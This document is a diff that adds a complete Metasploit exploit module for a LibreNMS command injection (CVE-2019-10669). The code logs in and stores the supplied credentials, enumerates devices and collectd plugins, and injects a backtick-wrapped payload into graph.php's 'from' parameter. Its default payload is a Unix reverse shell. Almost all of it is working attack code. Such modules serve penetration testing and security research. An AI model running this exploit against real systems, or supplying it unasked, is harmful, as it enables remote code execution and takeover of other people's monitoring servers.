@@ -1,0 +1,231 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'LibreNMS Collectd Command Injection',
+      'Description'    => %q(
+        This module exploits a command injection vulnerability in the
+        Collectd graphing functionality in LibreNMS.
+
+        The `to` and `from` parameters used to define the range for
+        a graph are sanitized using the `mysqli_escape_real_string()`
+        function, which permits backticks. These parameters are used
+        as part of a shell command that gets executed via the `passthru()`
+        function, which can result in code execution.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+      [
+        'Eldar Marcussen', # Vulnerability discovery
+        'Shelby Pace'      # Metasploit module
+      ],
+      'References'     =>
+        [
+          [ 'CVE', '2019-10669' ],
+          [ 'URL', 'https://www.darkmatter.ae/xen1thlabs/librenms-command-injection-vulnerability-xl-19-017/' ]
+        ],
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Targets'        =>
+      [
+        [ 'Linux',
+          {
+            'Platform'        =>  'unix',
+            'Arch'            =>  ARCH_CMD,
+            'DefaultOptions'  =>  { 'Payload' => 'cmd/unix/reverse' }
+          }
+        ]
+      ],
+      'DisclosureDate' => '2019-07-15',
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+    [
+      OptString.new('TARGETURI', [ true, 'Base LibreNMS path', '/' ]),
+      OptString.new('USERNAME', [ true, 'User name for LibreNMS', '' ]),
+      OptString.new('PASSWORD', [ true, 'Password for LibreNMS', '' ])
+    ])
+  end
+
+  def check
+    res = send_request_cgi!('method'  =>  'GET', 'uri'  =>  target_uri.path)
+    return Exploit::CheckCode::Safe unless res && res.body.downcase.include?('librenms')
+
+    about_res = send_request_cgi(
+      'method'  =>  'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'pages', 'about.inc.php')
+    )
+
+    return Exploit::CheckCode::Detected unless about_res && about_res.code == 200
+
+    version = about_res.body.match(/version\s+to\s+(\d+\.\d+\.?\d*)/)
+    return Exploit::CheckCode::Detected unless version && version.length > 1
+    vprint_status("LibreNMS version #{version[1]} detected")
+    version = Gem::Version.new(version[1])
+
+    return Exploit::CheckCode::Appears if version <= Gem::Version.new('1.50')
+  end
+
+  def login
+    login_uri = normalize_uri(target_uri.path, 'login')
+    res = send_request_cgi('method' =>  'GET',  'uri' =>  login_uri)
+    fail_with(Failure::NotFound, 'Failed to access the login page') unless res && res.code == 200
+
+    cookies = res.get_cookies
+    login_res = send_request_cgi(
+      'method'    =>  'POST',
+      'uri'       =>  login_uri,
+      'cookie'    =>  cookies,
+      'vars_post' =>
+      {
+        'username'  =>  datastore['USERNAME'],
+        'password'  =>  datastore['PASSWORD']
+      }
+    )
+
+    fail_with(Failure::NoAccess, 'Failed to submit credentials to login page') unless login_res && login_res.code == 302
+
+    cookies = login_res.get_cookies
+    res = send_request_cgi(
+      'method'  =>  'GET',
+      'uri'     =>  normalize_uri(target_uri.path),
+      'cookie'  =>  cookies
+    )
+    fail_with(Failure::NoAccess, 'Failed to log into LibreNMS') unless res && res.code == 200 && res.body.include?('Devices')
+
+    print_status('Successfully logged into LibreNMS. Storing credentials...')
+    store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])
+    login_res.get_cookies
+  end
+
+  def get_version
+    uri = normalize_uri(target_uri.path, 'about')
+
+    res = send_request_cgi( 'method'  =>  'GET', 'uri' => uri, 'cookie' => @cookies )
+    fail_with(Failure::NotFound, 'Failed to reach the about LibreNMS page') unless res && res.code == 200
+
+    html = res.get_html_document
+    version = html.search('tr//td//a')
+    fail_with(Failure::NotFound, 'Failed to retrieve version information') if version.empty?
+    version.each do |e|
+      return $1 if e.text =~ /(\d+\.\d+\.?\d*)/
+    end
+  end
+
+  def get_device_ids
+    version = get_version
+    print_status("LibreNMS version: #{version}")
+
+    if version && Gem::Version.new(version) < Gem::Version.new('1.50')
+      dev_uri = normalize_uri(target_uri.path, 'ajax_table.php')
+      format = '+list_detail'
+    else
+      dev_uri = normalize_uri(target_uri.path, 'ajax', 'table', 'device')
+      format = 'list_detail'
+    end
+
+    dev_res = send_request_cgi(
+      'method'    =>  'POST',
+      'uri'       =>  dev_uri,
+      'cookie'    =>  @cookies,
+      'vars_post' =>
+      {
+        'id'              =>  'devices',
+        'format'          =>  format,
+        'current'         =>  '1',
+        'sort[hostname]'  =>  'asc',
+        'rowCount'        =>  50
+      }
+    )
+
+    fail_with(Failure::NotFound, 'Failed to access the devices page') unless dev_res && dev_res.code == 200
+
+    json = JSON.parse(dev_res.body)
+    fail_with(Failure::NotFound, 'Unable to retrieve JSON response') if json.empty?
+
+    json = json['rows']
+    fail_with(Failure::NotFound, 'Unable to find hostname data') if json.empty?
+
+    hosts = []
+    json.each do |row|
+      hostname = row['hostname']
+      next if hostname.nil?
+
+      id = hostname.match('href=\"device\/device=(\d+)\/')
+      next unless id && id.length > 1
+      hosts << id[1]
+    end
+
+    fail_with(Failure::NotFound, 'Failed to retrieve any device ids') if hosts.empty?
+
+    hosts
+  end
+
+  def get_plugin_info(id)
+    uri = normalize_uri(target_uri.path, "device", "device=#{id}", "tab=collectd")
+
+    res = send_request_cgi( 'method' => 'GET', 'uri' => uri, 'cookie' => @cookies )
+    return unless res && res.code == 200
+
+    html = res.get_html_document
+    plugin_link = html.at('div[@class="col-md-3"]//a/@href')
+    return if plugin_link.nil?
+
+    plugin_link = plugin_link.value
+    plugin_hash = Hash[plugin_link.split('/').map { |plugin_val| plugin_val.split('=') }]
+    c_plugin = plugin_hash['c_plugin']
+    c_type = plugin_hash['c_type']
+    c_type_instance = plugin_hash['c_type_instance'] || ''
+    c_plugin_instance = plugin_hash['c_plugin_instance'] || ''
+
+    return c_plugin, c_type, c_plugin_instance, c_type_instance
+  end
+
+  def exploit
+    req_uri = normalize_uri(target_uri.path, 'graph.php')
+    @cookies = login
+
+    dev_ids = get_device_ids
+
+    collectd_device = -1
+    plugin_name = nil
+    plugin_type = nil
+    plugin_instance = nil
+    plugin_type_inst = nil
+    dev_ids.each do |device|
+     collectd_device = device
+     plugin_name, plugin_type, plugin_instance, plugin_type_inst = get_plugin_info(device)
+     break if (plugin_name && plugin_type && plugin_instance && plugin_type_inst)
+     collectd_device = -1
+    end
+
+    fail_with(Failure::NotFound, 'Failed to find a collectd plugin for any of the devices') if collectd_device == -1
+    print_status("Sending payload via device #{collectd_device}")
+
+    res = send_request_cgi(
+      'method'    =>  'GET',
+      'uri'       =>  req_uri,
+      'cookie'    =>  @cookies,
+      'vars_get'  =>
+      {
+        'device'                =>  collectd_device,
+        'type'                  =>  'device_collectd',
+        'to'                    =>  Rex::Text.rand_text_numeric(10),
+        'from'                  =>  "1`#{payload.encoded}`",
+        'c_plugin'              =>  plugin_name,
+        'c_type'                =>  plugin_type,
+        'c_plugin_instance'     =>  plugin_instance,
+        'c_type_instance'       =>  plugin_type_inst
+      }
+    )
+  end
+end
